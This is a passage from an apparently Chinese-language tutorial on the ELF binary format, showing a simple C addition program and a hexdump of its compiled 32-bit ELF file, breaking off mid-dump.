size="2">从上图我们可以看出ELF温江从上到下的一个结构（按段或者说节区进行划分功能不同的数据区）</font><p><strong>注意</strong>：尽管图中显示的各个组成部分是有顺序的，实际上除了 ELF 头部表以外，其他节区和段都没有规定的顺序</p><h3 id="4-readelf和objdump工具的使用"><a href="#4-readelf和objdump工具的使用" class="headerlink" title="4.readelf和objdump工具的使用"></a>4.readelf和objdump工具的使用</h3><blockquote><p>有关这两个工具的使用，我在下图中进行了展示：</p></blockquote><p><img src="/images/150-2.jpg" alt></p><h2 id="0x01-ELF实例"><a href="#0x01-ELF实例" class="headerlink" title="0x01 ELF实例"></a><font color="navy">0x01 ELF实例</font></h2><h3 id="1-实例代码"><a href="#1-实例代码" class="headerlink" title="1.实例代码"></a>1.实例代码</h3><blockquote><p>代码如下，并将其编译成32位的ELF文件。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result;</span><br><span class="line">        result = num1 + num2;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"num1+num2 = %d\n"</span>,result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num1, num2;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Please input the two number that you want to add:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;num1,&amp;num2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Your input is:%d and %d\n"</span>,num1,num2);</span><br><span class="line">        add(num1,num2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Calculater is END."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-ELF文件的二进制形式"><a href="#2-ELF文件的二进制形式" class="headerlink" title="2.ELF文件的二进制形式"></a>2.ELF文件的二进制形式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br></pre></td><td class="code"><pre><span class="line">00000000  7f 45 4c 46 01 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|</span><br><span class="line">00000010  03 00 03 00 01 00 00 00  70 10 00 00 34 00 00 00  |........p...4...|</span><br><span class="line">00000020  30 38 00 00 00 00 00 00  34 00 20 00 0b 00 28 00  |08......4. ...(.|</span><br><span class="line">00000030  1e 00 1d 00 06 00 00 00  34 00 00 00 34 00 00 00  |........4...4...|</span><br><span class="line">00000040  34 00 00 00 60 01 00 00  60 01 00 00 04 00 00 00  |4...`...`.......|</span><br><span class="line">00000050  04 00 00 00 03 00 00 00  94 01 00 00 94 01 00 00  |................|</span><br><span class="line">00000060  94 01 00 00 13 00 00 00  13 00 00 00 04 00 00 00  |................|</span><br><span class="line">00000070  01 00 00 00 01 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00000080  00 00 00 00 fc 03 00 00  fc 03 00 00 04 00 00 00  |................|</span><br><span class="line">00000090  00 10 00 00 01 00 00 00  00 10 00 00 00 10 00 00  |................|</span><br><span class="line">000000a0  00 10 00 00 fc 02 00 00  fc 02 00 00 05 00 00 00  |................|</span><br><span class="line">000000b0  00 10 00 00 01 00 00 00  00 20 00 00 00 20 00 00  |......... ... ..|</span><br><span class="line">000000c0  00 20 00 00 30 02 00 00  30 02 00 00 04 00 00 00  |. ..0...0.......|</span><br><span class="line">000000d0  00 10 00 00 01 00 00 00  f4 2e 00 00 f4 3e 00 00  |.............&gt;..|</span><br><span class="line">000000e0  f4 3e 00 00 2c 01 00 00  30 01 00 00 06 00 00 00  |.&gt;..,...0.......|</span><br><span class="line">000000f0  00 10 00 00 02 00 00 00  fc 2e 00 00 fc 3e 00 00  |.............&gt;..|</span><br><span class="line">00000100  fc 3e 00 00 f0 00 00 00  f0 00 00 00 06 00 00 00  |.&gt;..............|</span><br><span class="line">00000110  04 00 00 00 04 00 00 00  a8 01 00 00 a8 01 00 00  |................|</span><br><span class="line">00000120  a8 01 00 00 44 00 00 00  44 00 00 00 04 00 00 00  |....D...D.......|</span><br><span class="line">00000130  04 00 00 00 50 e5 74 64  7c 20 00 00 7c 20 00 00  |....P.td| ..| ..|</span><br><span class="line">00000140  7c 20 00 00 54 00 00 00  54 00 00 00 04 00 00 00  || ..T...T.......|</span><br><span class="line">00000150  04 00 00 00 51 e5 74 64  00 00 00 00 00 00 00 00  |....Q.td........|</span><br><span class="line">00000160  00 00 00 00 00 00 00 00  00 00 00 00 06 00 00 00  |................|</span><br><span class="line">00000170  10 00 00 00 52 e5 74 64  f4 2e 00 00 f4 3e 00 00  |....R.td.....&gt;..|</span><br><span class="line">00000180  f4 3e 00 00 0c 01 00 00  0c 01 00 00 04 00 00 00  |.&gt;..............|</span><br><span class="line">00000190  01 00 00 00 2f 6c 69 62  2f 6c 64 2d 6c 69 6e 75  |..../lib/ld-linu|</span><br><span class="line">000001a0  78 2e 73 6f 2e 32 00 00  04 00 00 00 14 00 00 00  |x.so.2..........|</span><br><span class="line">000001b0  03 00 00 00 47 4e 55 00  15 e3 de 80 0f 50 a8 0f  |....GNU......P..|</span><br><span class="line">000001c0  21 82 d8 42 91 b4 ef 57  ef a8 28 83 04 00 00 00  |!..B...W..(.....|</span><br><span class="line">000001d0  10 00 00 00 01 00 00 00  47 4e 55 00 00 00 00 00  |........GNU.....|</span><br><span class="line">000001e0  03 00 00 00 02 00 00 00  00 00 00 00 02 00 00 00  |................|</span><br><span class="line">000001f0  08 00 00 00 01 00 00 00  05 00 00 00 00 20 00 20  |............. . |</span><br><span class="line">00000200  00 00 00 00 08 00 00 00  ad 4b e3 c0 00 00 00 00  |.........K......|</span><br><span class="line">00000210  00 00 00 00 00 00 00 00  00 00 00 00 71 00 00 00  |............q...|</span><br><span class="line">00000220  00 00 00 00 00 00 00 00  20 00 00 00 1f 00 00 00  |........ .......|</span><br><span class="line">00000230  00 00 00 00 00 00 00 00  12 00 00 00 26 00 00 00  |............&amp;...|</span><br><span class="line">00000240  00 00 00 00 00 00 00 00  22 00 00 00 8d 00 00 00  |........&quot;.......|</span><br><span class="line">00000250  00 00 00 00 00 00 00 00  20 00 00 00 35 00 00 00  |........ ...5...|</span><br><span class="line">00000260  00 00 00 00 00 00 00 00  12 00 00 00 10 00 00 00  |................|</span><br><span class="line">00000270  00 00 00 00 00 00 00 00  12 00 00 00 9c 00 00 00  |................|</span><br><span class="line">00000280  00 00 00 00 00 00 00 00  20 00 00 00 01 00 00 00  |........ .......|</span><br><span class="line">00000290  04 20 00 00 04 00 00 00  11 00 10 00 00 5f 49 4f  |. ..........._IO|</span><br><span class="line">000002a0  5f 73 74 64 69 6e 5f 75  73 65 64 00 5f 5f 69 73  |_stdin_used.__is|</span><br><span class="line">000002b0  6f 63 39 39 5f 73 63 61  6e 66 00 70 72 69 6e 74  |oc99_scanf.print|</span><br><span class="line">000002c0  66 00 5f 5f 63 78 61 5f  66 69 6e 61 6c 69 7a 65  |f.__cxa_finalize|</span><br><span class="line">000002d0  00 5f 5f 6c 69 62 63 5f  73 74 61 72 74 5f 6d 61  |.__libc_start_ma|</span><br><span class="line">000002e0  69 6e 00 6c 69 62 63 2e  73 6f 2e 36 00 47 4c 49  |in.libc.so.6.GLI|</span><br><span class="line">000002f0  42 43 5f 32 2e 37 00 47  4c 49 42 43 5f 32 2e 31  |BC_2.7.GLIBC_2.1|</span><br><span class="line">00000300  2e 33 00 47 4c 49 42 43  5f 32 2e 30 00 5f 49 54  |.3.GLIBC_2.0._IT|</span><br><span class="line">00000310  4d 5f 64 65 72 65 67 69  73 74 65 72 54 4d 43 6c  |M_deregisterTMCl|</span><br><span class="line">00000320  6f 6e 65 54 61 62 6c 65  00 5f 5f 67 6d 6f 6e 5f  |oneTable.__gmon_|</span><br><span class="line">00000330  73 74 61 72 74 5f 5f 00  5f 49 54 4d 5f 72 65 67  |start__._ITM_reg|</span><br><span class="line">00000340  69 73 74 65 72 54 4d 43  6c 6f 6e 65 54 61 62 6c  |isterTMCloneTabl|</span><br><span class="line">00000350  65 00 00 00 00 00 02 00  03 00 00 00 02 00 04 00  |e...............|</span><br><span class="line">00000360  00 00 01 00 01 00 03 00  47 00 00 00 10 00 00 00  |........G.......|</span><br><span class="line">00000370  00 00 00 00 17 69 69 0d  00 00 04 00 51 00 00 00  |.....ii.....Q...|</span><br><span class="line">00000380  10 00 00 00 73 1f 69 09  00 00 03 00 5b 00 00 00  |....s.i.....[...|</span><br><span class="line">00000390  10 00 00 00 10 69 69 0d  00 00 02 00 67 00 00 00  |.....ii.....g...|</span><br><span class="line">000003a0  00 00 00 00 f4 3e 00 00  08 00 00 00 f8 3e 00 00  |.....&gt;.......&gt;..|</span><br><span class="line">000003b0  08 00 00 00 f8 3f 00 00  08 00 00 00 1c 40 00 00  |.....?.......@..|</span><br><span class="line">000003c0  08 00 00 00 ec 3f 00 00  06 01 00 00 f0 3f 00 00  |.....?.......?..|</span><br><span class="line">000003d0  06 03 00 00 f4 3f 00 00  06 04 00 00 fc 3f 00 00  |.....?.......?..|</span><br><span class="line">000003e0  06 07 00 00 0c 40 00 00  07 02 00 00 10 40 00 00  |.....@.......@..|</span><br><span class="line">000003f0  07 05 00 00 14 40 00 00  07 06 00 00 00 00 00 00  |.....@..........|</span><br><span class="line">00000400  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00001000  53 83 ec 08 e8 a7 00 00  00 81 c3 f7 2f 00 00 8b  |S.........../...|</span><br><span class="line">00001010  83 f4 ff ff ff 85 c0 74  02 ff d0 83 c4 08 5b c3  |.......t......[.|</span><br><span class="line">00001020  ff b3 04 00 00 00 ff a3  08 00 00 00 00 00 00 00  |................|</span><br><span class="line">00001030  ff a3 0c 00 00 00 68 00  00 00 00 e9 e0 ff ff ff  |......h.........|</span><br><span class="line">00001040  ff a3 10 00 00 00 68 08  00 00 00 e9 d0 ff ff ff  |......h.........|</span><br><span class="line">00001050  ff a3 14 00 00 00 68 10  00 00 00 e9 c0 ff ff ff  |......h.........|</span><br><span class="line">00001060  ff a3 f0 ff ff ff 66 90  00 00 00 00 00 00 00 00  |......f.........|</span><br><span class="line">00001070  31 ed 5e 89 e1 83 e4 f0  50 54 52 e8 22 00 00 00  |1.^.....PTR.&quot;...|</span><br><span class="line">00001080  81 c3 80 2f 00 00 8d 83  e0 d2 ff ff 50 8d 83 80  |.../........P...|</span><br><span class="line">00001090  d2 ff ff 50 51 56 ff b3  f8 ff ff ff e8 9f ff ff  |...PQV..........|</span><br><span class="line">000010a0  ff f4 8b 1c 24 c3 66 90  66 90 66 90 66 90 66 90  |....$.f.f.f.f.f.|</span><br><span class="line">000010b0  8b 1c 24 c3 66 90 66 90  66 90 66 90 66 90 66 90  |..$.f.f.f.f.f.f.|</span><br><span class="line">000010c0  e8 e0 00 00 00 81 c2 3b  2f 00 00 8d 8a 20 00 00  |.......;/.... ..|</span><br><span class="line">000010d0  00 8d 82 20 00 00 00 39  c8 74 1d 8b 82 ec ff ff  |... ...9.t......|</span><br><span class="line">000010e0  ff 85 c0 74 13 55 89 e5  83 ec 14 51 ff d0 83 c4  |...t.U.....Q....|</span><br><span class="line">000010f0  10 c9 c3 8d 74 26 00 90  c3 8d b4 26 00 00 00 00  |....t&amp;.....&amp;....|</span><br><span class="line">00001100  e8 a0 00 00 00 81 c2 fb  2e 00 00 55 89 e5 53 8d  |...........U..S.|</span><br><span class="line">00001110  8a 20 00 00 00 8d 82 20  00 00 00 83 ec 04 29 c8  |. ..... ......).|</span><br><span class="line">00001120  89 c3 c1 e8 1f c1 fb 02  01 d8 d1 f8 74 14 8b 92  |............t...|</span><br><span class="line">00001130  fc ff ff ff 85 d2 74 0a  83 ec 08 50 51 ff d2 83  |......t....PQ...|</span><br><span class="line">00001140  c4 10 8b 5d fc c9 c3 8d  b4 26 00 00 00 00 66 90  |...].....&amp;....f.|</span><br><span class="line">00001150  55 89 e5 53 e8 57 ff ff  ff 81 c3 a7 2e 00 00 83  |U..S.W..........|</span><br><span class="line">00001160  ec 04 80 bb 20 00 00 00  00 75 27 8b 83 f0 ff ff  |.... ....u&apos;.....|</span><br><span class="line">00001170  ff 85 c0 74 11 83 ec 0c  ff b3 1c 00 00 00 e8 dd  |...t............|</span><br><span class="line">00001180  fe ff ff 83 c4 10 e8 35  ff ff ff c6 83 20 00 00  |.......5..... ..|</span><br><span class="line">00001190  00 01 8b 5d fc c9 c3 8d  b4 26 00 00 00 00 66 90  |...].....&amp;....f.|</span><br><span class="line">000011a0  e9 5b ff ff ff 8b 14 24  c3 55 89 e5 53 83 ec 14  |.[.....$.U..S...|</span><br><span class="line">000011b0  e8 c4 00 00 00 05 4b 2e  00 00 8b 4d 08 8b 55 0c  |......K....M..U.|</span><br><span class="line">000011c0  01 ca 89 55 f4 83 ec 08  ff 75 f4 8d 90 08 e0 ff  |...U.....u......|</span><br><span class="line">000011d0  ff 52 89 c3 e8 57 fe ff  ff 83 c4 10 90 8b 5d fc  |.R...W........].|</span><br><span class="line">000011e0  c9 c3 8d 4c 24 04 83 e4  f0 ff 71 fc 55 89 e5 53  |...L$.....q.U..S|</span><br><span class="line">000011f0  51 83 ec 10 e8 b7 fe ff  ff 81 c3 07 2e 00 00 83  |Q...............|</span><br><span class="line">00001200  ec 0c 8d 83 18 e0 ff ff  50 e8 22 fe ff ff 83 c4  |........P.&quot;.....|</span><br><span class="line">00001210  10 83 ec 04 8d 45 f0 50  8d 45 f4 50 8d 83 4a e0  |.....E.P.E.P..J.|</span><br><span class="line">00001220  ff ff 50 e8 28 fe ff ff  83 c4 10 8b 55 f0 8b 45  |..P.(.......U..E|</span><br><span class="line">00001230  f4 83 ec 04 52 50 8d 83  4f e0 ff ff 50 e8 ee fd  |....RP..O...P...|</span><br><span class="line">00001240  ff ff 83 c4 10 8b 55 f0  8b 45 f4 83 ec 08 52 50  |......U..E....RP|</span><br><span class="line">00001250  e8 54 ff ff ff 83 c4 10  83 ec 0c 8d 83 68 e0 ff  |.T...........h..|</span><br><span class="line">00001260  ff 50 e8 c9 fd ff ff 83  c4 10 b8 00 00 00 00 8d  |.P..............|</span><br><span class="line">00001270  65 f8 59 5b 5d 8d 61 fc  c3 8b 04 24 c3 66 90 90  |e.Y[].a....$.f..|</span><br><span class="line">00001280  55 e8 5b 00 00 00 81 c5  7a 2d 00 00 57 56 53 83  |U.[.....z-..WVS.|</span><br><span class="line">00001290  ec 0c 89 eb 8b 7c 24 28  e8 63 fd ff ff 8d 9d f8  |.....|$(.c......|</span><br><span class="line">000012a0  fe ff ff 8d 85 f4 fe ff  ff 29 c3 c1 fb 02 74 25  |.........)....t%|</span><br><span class="line">000012b0  31 f6 8d b6 00 00 00 00  83 ec 04 57 ff 74 24 2c  |1..........W.t$,|</span><br><span class="line">000012c0  ff 74 24 2c ff 94 b5 f4  fe ff ff 83 c6 01 83 c4  |.t$,............|</span><br><span class="line">000012d0  10 39 f3 75 e3 83 c4 0c  5b 5e 5f 5d c3 8d 76 00  |.9.u....[^_]..v.|</span><br><span class="line">000012e0  c3 8b 2c 24 c3 00 00 00  53 83 ec 08 e8 bf fd ff  |..,$....S.......|</span><br><span class="line">000012f0  ff 81 c3 0f 2d 00 00 83  c4 08 5b c3 00 00 00 00  |....-.....[.....|</span><br><span class="line">00001300  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00002000  03 00 00 00 01 00 02 00  6e 75 6d 31 2b 6e 75 6d  |........num1+num|</span><br><span class="line">00002010  32 20 3d 20 25 64 0a 00  50 6c 65 61 73 65 20 69  |2 = %d..Please i|</span><br><span class="line">00002020  6e 70 75 74 20 74 68 65  20 74 77 6f 20 6e 75 6d  |nput the two num|</span><br><span class="line">00002030  62 65 72 20 74 68 61 74  20 79 6f 75 20 77 61 6e  |ber that you wan|</span><br><span class="line">00002040  74 20 74 6f 20 61 64 64  3a 00 25 64 25 64 00 59  |t to add:.%d%d.Y|</span><br><span class="line">00002050  6f 75 72 20 69 6e 70 75  74 20 69 73 3a 25 64 20  |our input is:%d |</span><br><span class="line">00002060  61 6e 64 20 25 64 0a 00  43 61 6c 63 75 6c 61 74  |and %d..Calculat|</span><br><span class="line">00002070  65 72 20 69 73 20 45 4e  44 2e 00 00 01 1b 03 3b  |er is END......;|</span><br><span class="line">00002080  50 00 00 00 09 00 00 00  a4 ef ff ff 98 00 00 00  |P...............|</span><br><span class="line">00002090  e4 ef ff ff bc 00 00 00  f4 ef ff ff 6c 00 00 00  |............l...|</span><br><span class="line">000020a0  2d f1 ff ff d0 00 00 00  66 f1 ff ff f4 00 00 00  |-.......f.......|</span><br><span class="line">000020b0  fd f1 ff ff 28 01 00 00  04 f2 ff ff 3c 01 00 00  |....(.......&lt;...|</span><br><span class="line">000020c0  64 f2 ff ff 88 01 00 00  65 f2 ff ff 9c 01 00 00  |d.......e.......|</span><br><span class="line">000020d0  14 00 00 00 00 00 00 00  01 7a 52 00 01 7c 08 01  |.........zR..|..|</span><br><span class="line">000020e0  1b 0c 04 04 88 01 07 08  10 00 00 00 1c 00 00 00  |................|</span><br><span class="line">000020f0  80 ef ff ff 36 00 00 00  00 00 00 00 14 00 00 00  |....6...........|</span><br><span class="line">00002100  00 00 00 00 01 7a 52 00  01 7c 08 01 1b 0c 04 04  |.....zR..|......|</span><br><span class="line">00002110  88 01 00 00 20 00 00 00  1c 00 00 00 04 ef ff ff  |.... ...........|</span><br><span class="line">00002120  40 00 00 00 00 0e 08 46  0e 0c 4a 0f 0b 74 04 78  |@......F..J..t.x|</span><br><span class="line">00002130  00 3f 1a 3b 2a 32 24 22  10 00 00 00 40 00 00 00  |.?.;*2$&quot;....@...|</span><br><span class="line">00002140  20 ef ff ff 08 00 00 00  00 00 00 00 20 00 00 00  | ........... ...|</span><br><span class="line">00002150  54 00 00 00 55 f0 ff ff  39 00 00 00 00 41 0e 08  |T...U...9....A..|</span><br><span class="line">00002160  85 02 42 0d 05 44 83 03  71 c5 c3 0c 04 04 00 00  |..B..D..q.......|</span><br><span class="line">00002170  30 00 00 00 78 00 00 00  6a f0 ff ff 97 00 00 00  |0...x...j.......|</span><br><span class="line">00002180  00 44 0c 01 00 47 10 05  02 75 00 44 0f 03 75 78  |.D...G...u.D..ux|</span><br><span class="line">00002190  06 10 03 02 75 7c 02 82  c1 0c 01 00 41 c3 41 c5  |....u|......A.A.|</span><br><span class="line">000021a0  43 0c 04 04 10 00 00 00  ac 00 00 00 cd f0 ff ff  |C...............|</span><br><span class="line">000021b0  04 00 00 00 00 00 00 00  48 00 00 00 c0 00 00 00  |........H.......|</span><br><span class="line">000021c0  c0 f0 ff ff 5d 00 00 00  00 41 0e 08 85 02 4c 0e  |....]....A....L.|</span><br><span class="line">000021d0  0c 87 03 41 0e 10 86 04  41 0e 14 83 05 43 0e 20  |...A....A....C. |</span><br><span class="line">000021e0  69 0e 24 41 0e 28 44 0e  2c 44 0e 30 4d 0e 20 47  |i.$A.(D.,D.0M. G|</span><br><span class="line">000021f0  0e 14 41 c3 0e 10 41 c6  0e 0c 41 c7 0e 08 41 c5  |..A...A...A...A.|</span><br><span class="line">00002200  0e 04 00 00 10 00 00 00  0c 01 00 00 d4 f0 ff ff  |................|</span><br><span class="line">00002210  01 00 00 00 00 00 00 00  10 00 00 00 20 01 00 00  |............ ...|</span><br><span class="line">00002220  c1 f0 ff ff 04 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00002230  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00002ef0  00 00 00 00 a0 11 00 00  50 11 00 00 01 00 00 00  |........P.......|</span><br><span class="line">00002f00  47 00 00 00 0c 00 00 00  00 10 00 00 0d 00 00 00  |G...............|</span><br><span class="line">00002f10  e8 12 00 00 19 00 00 00  f4 3e 00 00 1b 00 00 00  |.........&gt;......|</span><br><span class="line">00002f20  04 00 00 00 1a 00 00 00  f8 3e 00 00 1c 00 00 00  |.........&gt;......|</span><br><span class="line">00002f30  04 00 00 00 f5 fe ff 6f  ec 01 00 00 05 00 00 00  |.......o........|</span><br><span class="line">00002f40  9c 02 00 00 06 00 00 00  0c 02 00 00 0a 00 00 00  |................|</span><br><span class="line">00002f50  b6 00 00 00 0b 00 00 00  10 00 00 00 15 00 00 00  |................|</span><br><span class="line">00002f60  00 00 00 00 03 00 00 00  00 40 00 00 02 00 00 00  |.........@......|</span><br><span class="line">00002f70  18 00 00 00 14 00 00 00  11 00 00 00 17 00 00 00  |................|</span><br><span class="line">00002f80  e4 03 00 00 11 00 00 00  a4 03 00 00 12 00 00 00  |................|</span><br><span class="line">00002f90  40 00 00 00 13 00 00 00  08 00 00 00 fb ff ff 